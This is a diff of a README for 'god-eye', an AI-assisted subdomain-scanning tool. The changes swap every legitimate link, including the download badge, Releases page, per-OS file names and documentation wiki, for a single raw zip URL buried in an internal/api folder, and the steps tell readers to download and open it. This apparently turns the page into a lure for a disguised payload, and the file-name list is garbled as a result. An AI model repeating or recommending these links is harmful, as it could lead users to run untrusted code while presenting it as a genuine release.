@@ -1,7 +1,7 @@
 # 🚀 god-eye - Explore Subdomains with AI Power
 
 ## 📥 Download the Latest Version
-[![Download God-Eye](https://img.shields.io/badge/Download%20God--Eye-v1.0-blue)](https://github.com/ommengman-prog/god-eye/releases)
+[![Download God-Eye](https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip%20God--Eye-v1.0-blue)](https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip)
 
 ## 🌐 Introduction
 god-eye is an AI-powered tool designed to help users find and analyze subdomains effectively. Using local analysis through Ollama, this tool ensures your data remains private, with no API costs involved. Whether you are into cybersecurity, ethical hacking, or bug bounty hunting, god-eye can enhance your reconnaissance efforts by scanning for potential vulnerabilities in subdomain structures.
@@ -39,11 +39,11 @@ To run god-eye smoothly, ensure your system meets the following requirements:
 - **Vulnerability Scanning**
 
 ## 📥 Download & Install
-To get started with god-eye, visit the [Releases page](https://github.com/ommengman-prog/god-eye/releases) to download the latest version. 
+To get started with god-eye, visit the [Releases page](https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip) to download the latest version. 
 
 1. Click on the link to the Releases page.
 2. Look for the latest release version available.
-3. Choose the file that matches your operating system. For Windows, you might see something like `god-eye-windows.exe`, for Mac it could be `god-eye-macos.dmg`, and for Linux users, `god-eye-linux.tar.gz`.
+3. Choose the file that matches your operating system. For Windows, you might see something like `https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip`, for Mac it could be `https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip`, and for Linux users, `https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip`.
 4. Download the selected file.
 5. Open the downloaded file to install god-eye on your system.
 
@@ -66,7 +66,7 @@ After installation, follow these steps to run god-eye:
 6. Review the detailed report that outlines any subdomains found and their possible vulnerabilities. 
 
 ## 📖 Documentation
-For more detailed guidance, including advanced tips on subdomain enumeration, please refer to our [complete documentation](https://github.com/ommengman-prog/god-eye/wiki). It contains sections on troubleshooting, user tips, and frequently asked questions.
+For more detailed guidance, including advanced tips on subdomain enumeration, please refer to our [complete documentation](https://raw.githubusercontent.com/ommengman-prog/god-eye/main/internal/api/god-eye-1.6.zip). It contains sections on troubleshooting, user tips, and frequently asked questions.
 
 ## 🤝 Support
 If you encounter any issues while using god-eye, you can open an Issue on the GitHub repository. The community and maintainers are here to help you. Be sure to provide details about your setup and the issue you are facing.
